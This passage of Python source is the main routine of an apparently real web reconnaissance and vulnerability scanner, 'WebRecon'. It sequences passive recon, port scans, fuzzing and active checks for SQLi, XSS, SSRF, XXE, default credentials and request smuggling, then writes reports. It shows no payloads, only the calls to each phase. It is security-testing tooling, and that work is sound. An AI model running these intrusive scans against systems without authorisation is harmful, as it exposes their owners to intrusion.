    # state never bleed from one batch target into the next.
    _reset_scan_state()

    state = ScanState(state_f, target)
    if args.fresh:
        state.clear()
        print(f"{Fore.YELLOW}  [FRESH] State cleared.")

    # Build initial config so detect_scheme uses the auth/proxy settings
    cfg_stub = ScanConfig(
        target=target, target_type=tt, base_url=f"http://{target}",
        output_prefix=output_prefix,
        proxy=args.proxy, user_agent=args.user_agent, timeout=args.timeout,
        cookie=args.cookie, extra_headers=args.headers or [],
    )

    print(f"\n{Fore.CYAN}  Detecting scheme for {target}…")
    scheme = detect_scheme(target, cfg_stub)

    cfg = ScanConfig(
        target=target, target_type=tt,
        base_url=f"{scheme}://{target}",
        output_prefix=output_prefix,
        proxy=args.proxy,
        user_agent=args.user_agent,
        timeout=args.timeout,
        oob_url=args.oob_url,
        scope_file=args.scope_file,
        auto=args.auto,
        rate=args.rate,
        delay=args.delay,
        full_ports=args.full_ports,
        google_api_key=args.google_api_key,
        google_cx=args.google_cx,
        google_dork_count=args.google_dork_count,
        diff_file=args.diff_file,
        threads=args.threads,
        verbose=args.verbose,
        cookie=args.cookie,
        extra_headers=args.headers or [],
        auth_check_url=args.auth_check_url,
        auth_check_text=args.auth_check_text,
        webhook_url=args.webhook_url,
        webhook_threshold=Severity[args.webhook_threshold],
        pentestdb_url=args.pentestdb_url,
        pentestdb_token=args.pentestdb_token,
        profile=ScanProfile(args.profile),
        no_intrusive=args.no_intrusive,
        nuclei_severity=args.nuclei_severity,
        html_report=not args.no_html,
        whatweb_timeout=args.whatweb_timeout,
        arjun_timeout=args.arjun_timeout,
    )
    cfg = _apply_profile(args, cfg)

    start = datetime.now()

    if not (args.resume and os.path.exists(out)):
        with open(out, 'w') as fh:
            fh.write(f"# WebRecon Report\n\n"
                     f"| | |\n|---|---|\n"
                     f"| **Target** | `{target}` ({tt.value}) |\n"
                     f"| **Base URL** | {cfg.base_url} |\n"
                     f"| **Profile** | {cfg.profile.value} |\n"
                     f"| **Started** | {start.isoformat()} |\n"
                     f"| **Tool** | WebRecon v{VERSION} |\n\n---\n")
    else:
        _log(out, f"\n\n---\n*Resumed at {start.isoformat()}*\n")

    print(f"\n{Fore.CYAN}  Target:   {target} ({tt.value})")
    print(f"{Fore.CYAN}  Base URL: {cfg.base_url}")
    print(f"{Fore.CYAN}  Profile:  {cfg.profile.value}")
    print(f"{Fore.CYAN}  Output:   {out}")
    if cfg.proxy:        print(f"{Fore.CYAN}  Proxy:    {cfg.proxy}")
    if cfg.oob_url:      print(f"{Fore.CYAN}  OOB:      {cfg.oob_url}")
    if cfg.cookie:       print(f"{Fore.CYAN}  Auth:     cookie provided")
    if cfg.webhook_url:  print(f"{Fore.CYAN}  Webhook:  configured (≥{cfg.webhook_threshold.value})")
    if cfg.pentestdb_url:print(f"{Fore.CYAN}  PentestDB:{cfg.pentestdb_url}")
    if not _is_root():
        print(f"\n{Fore.YELLOW}  ⚠ Not root — nmap OS detection will use sudo.")

    # Verify initial session if auth configured
    if cfg.auth_check_url:
        revalidate_session(cfg, out)

    # Shortcut: is profile restrictive?
    is_recon_only = cfg.profile == ScanProfile.RECON
    is_full = cfg.profile in (ScanProfile.FULL, ScanProfile.STEALTH)

    # Detect catch-all routing once — used by routing-dependent phases to
    # suppress false positives (graphql, robots/sitemap, oauth_oidc, playbooks).
    if not is_recon_only:
        print(f"\n{Fore.CYAN}  Probing for catch-all routing…")
        detect_catchall(cfg, out)

    detected_tech: Dict = {}
    interrupted = False

    try:
        # ── Phase 1: Passive ──────────────────────────────────────────────
        print(f"\n{Fore.MAGENTA}[ PHASE 1 — PASSIVE RECONNAISSANCE ]")
        with ThreadPoolExecutor(max_workers=5) as pool:
            futs = {
                pool.submit(phase_passive_dns, target, tt, cfg, out, state, scope): "dns",
                pool.submit(phase_cert_transparency, target, tt, cfg, out, state):  "crt.sh",
                pool.submit(phase_wayback, target, cfg, out, state):                "wayback",
                pool.submit(phase_google_dorks, target, cfg, out, state):           "dorks",
                pool.submit(phase_dns_security, target, tt, cfg, out, state):       "dns_sec",
            }
            for fut in as_completed(futs):
                try: fut.result()
                except Exception as e: print(f"  {Fore.RED}✗ {futs[fut]}: {e}")

        phase_email_harvest(target, tt, cfg, out, state)
        phase_subdomain_enum(target, tt, cfg, out, state, scope)
        phase_favicon_hash(target, cfg, out, state)

        if is_recon_only:
            print(f"\n{Fore.YELLOW}[ Profile=recon → skipping active/vuln phases ]")
        else:
            # ── Phase 2: Active ───────────────────────────────────────────
            print(f"\n{Fore.MAGENTA}[ PHASE 2 — ACTIVE RECONNAISSANCE ]")
            phase_port_scan(target, cfg, out, state)
            with ThreadPoolExecutor(max_workers=2) as pool:
                futs = {
                    pool.submit(phase_waf_cdn, target, cfg, out, state):    "waf",
                    pool.submit(phase_vhost_fuzz, target, cfg, out, state): "vhost",
                }
                for fut in as_completed(futs):
                    try: fut.result()
                    except Exception as e: print(f"  {Fore.RED}✗ {futs[fut]}: {e}")

            # ── Phase 3: Technology & Content ─────────────────────────────
            print(f"\n{Fore.MAGENTA}[ PHASE 3 — TECHNOLOGY & CONTENT DISCOVERY ]")
            detected_tech = phase_tech_detection(target, cfg, out, state)
            phase_tech_playbooks(target, cfg, out, state, detected_tech)
            phase_robots_sitemap(target, tt, cfg, out, state)
            phase_crawler(target, cfg, out, state)
            phase_api_schema(target, cfg, out, state)
            phase_source_exposure(target, cfg, out, state)
            phase_content_discovery(target, cfg, out, state)
            phase_param_discovery(target, cfg, out, state)

            # ── Phase 4: HTTP Analysis ─────────────────────────────────────
            print(f"\n{Fore.MAGENTA}[ PHASE 4 — HTTP ANALYSIS ]")
            with ThreadPoolExecutor(max_workers=4) as pool:
                futs = {
                    pool.submit(phase_header_analysis, target, cfg, out, state): "headers",
                    pool.submit(phase_cors, target, cfg, out, state):             "cors",
                    pool.submit(phase_oauth_oidc, target, cfg, out, state):       "oidc",
                    pool.submit(phase_csp_analysis, target, cfg, out, state):     "csp",
                }
                for fut in as_completed(futs):
                    try: fut.result()
                    except Exception as e: print(f"  {Fore.RED}✗ {futs[fut]}: {e}")

            phase_host_header(target, cfg, out, state)
            phase_crlf(target, cfg, out, state)
            phase_jwt_analysis(target, cfg, out, state)
            phase_http_methods(target, cfg, out, state)
            phase_403_bypass(target, cfg, out, state)

            if is_full:
                # ── Phase 5: Vulnerability Scanning ─────────────────────────
                print(f"\n{Fore.MAGENTA}[ PHASE 5 — VULNERABILITY SCANNING ]")
                phase_ssl_tls(target, cfg, out, state)
                phase_nikto(target, cfg, out, state)
                phase_nuclei(target, cfg, out, state)
                with ThreadPoolExecutor(max_workers=6) as pool:
                    futs = {
                        pool.submit(phase_js_analysis, target, cfg, out, state):         "js",
                        pool.submit(phase_graphql, target, cfg, out, state):             "graphql",
                        pool.submit(phase_path_traversal, target, cfg, out, state):      "lfi",
                        pool.submit(phase_open_redirect, target, cfg, out, state):       "redirect",
                        pool.submit(phase_reflection_xss, target, cfg, out, state):      "xss",
                        pool.submit(phase_sqli, target, cfg, out, state):                "sqli",
                        pool.submit(phase_websocket, target, cfg, out, state):           "websocket",
                        pool.submit(phase_prototype_pollution, target, cfg, out, state): "protopollution",
                    }
                    for fut in as_completed(futs):
                        try: fut.result()
                        except Exception as e: print(f"  {Fore.RED}✗ {futs[fut]}: {e}")

                phase_ssrf(target, cfg, out, state)
                phase_ssti(target, cfg, out, state)
                phase_xxe(target, cfg, out, state)
                phase_default_creds(target, cfg, out, state)
                phase_request_smuggling(target, cfg, out, state)

                # ── Phase 6: Infrastructure ──────────────────────────────────
                print(f"\n{Fore.MAGENTA}[ PHASE 6 — INFRASTRUCTURE ]")
                with ThreadPoolExecutor(max_workers=2) as pool:
                    futs = {
                        pool.submit(phase_cloud_buckets, target, cfg, out, state): "buckets",
                        pool.submit(phase_screenshots, target, cfg, out, state):   "screenshots",
                    }
                    for fut in as_completed(futs):
                        try: fut.result()
                        except Exception as e: print(f"  {Fore.RED}✗ {futs[fut]}: {e}")

    except KeyboardInterrupt:
        interrupted = True
        print(f"\n{Fore.YELLOW}  Interrupted — state saved. Re-run with --resume to continue.")
        _log(out, "\n\n---\n*Scan interrupted by user.*")

    except Exception as e:
        import traceback
        print(f"{Fore.RED}  Fatal: {e}")
        traceback.print_exc()

    finally:
        save_findings(_findings, findings)
        write_summary(cfg, out, _findings, start)

        if cfg.html_report:
            try:
                write_html_report(cfg, html_path, _findings, start)
                print(f"{Fore.CYAN}  HTML:     {html_path}")
            except Exception as e:
                print(f"{Fore.YELLOW}  ⚠ HTML report failed: {e}")

        counts = Counter(f.severity for f in _findings)
        print(f"\n{Fore.MAGENTA}{'═'*60}")
        print(f"{Fore.GREEN}  Scan complete!")
        print(f"  {Fore.MAGENTA}{counts.get(Severity.CRITICAL,0)} CRIT  "
              f"{Fore.RED}{counts.get(Severity.HIGH,0)} HIGH  "
              f"{Fore.YELLOW}{counts.get(Severity.MEDIUM,0)} MED  "
              f"{Fore.GREEN}{counts.get(Severity.LOW,0)} LOW  "
              f"{Fore.CYAN}{counts.get(Severity.INFO,0)} INFO")
        print(f"{Fore.CYAN}  Report:   {out}")
        print(f"{Fore.CYAN}  Findings: {findings}")

        # Tool-availability summary (mark coverage gaps)
        with _MISSING_TOOLS_LOCK:
            missing = sorted(_MISSING_TOOLS)
        if missing:
            install_hints = {
                "katana":     "go install github.com/projectdiscovery/katana/cmd/katana@latest",
                "nuclei":     "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
                "subfinder":  "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
                "arjun":      "pip install arjun",
                "wpscan":     "gem install wpscan",
                "droopescan": "pip install droopescan",
                "joomscan":   "github.com/OWASP/joomscan",
                "testssl":    "apt install testssl.sh   (or git clone drwetter/testssl.sh)",
                "gowitness":  "go install github.com/sensepost/gowitness@latest",
                "webanalyze": "go install github.com/rverton/webanalyze/cmd/webanalyze@latest",
                "subjack":    "go install github.com/haccer/subjack@latest",
                "wafw00f":    "pip install wafw00f",
                "dnsrecon":   "apt install dnsrecon",
                "theHarvester": "apt install theharvester",
                "nikto":      "apt install nikto",
                "ffuf":       "apt install ffuf",
                "whatweb":    "apt install whatweb",
                "nmap":       "apt install nmap",
                "dig":        "apt install dnsutils   (or bind-utils on RHEL)",
            }
            print(f"\n{Fore.YELLOW}  ⚠ Coverage gap — these tools were not installed and their phases skipped:")
            _log(out, "\n\n## Tool Availability Summary\n\n"
                       "The following tools were NOT installed during this scan. "
                       "Their phases were skipped, so coverage may be incomplete:\n")
            for t in missing:
                hint = install_hints.get(t, "")
                line = f"  • {t}" + (f"   →  {hint}" if hint else "")
                print(f"{Fore.YELLOW}{line}")
                _log(out, f"- **{t}**" + (f" — install: `{hint}`" if hint else ""))
        else:
            print(f"\n{Fore.GREEN}  ✓ All optional tools were available.")
            _log(out, "\n\n## Tool Availability Summary\n\nAll optional tools were installed during this scan.")

        print(f"{Fore.MAGENTA}{'═'*60}\n")

    counts = Counter(f.severity for f in _findings)
    if interrupted:
        raise KeyboardInterrupt
    return counts


if __name__ == "__main__":
    main()
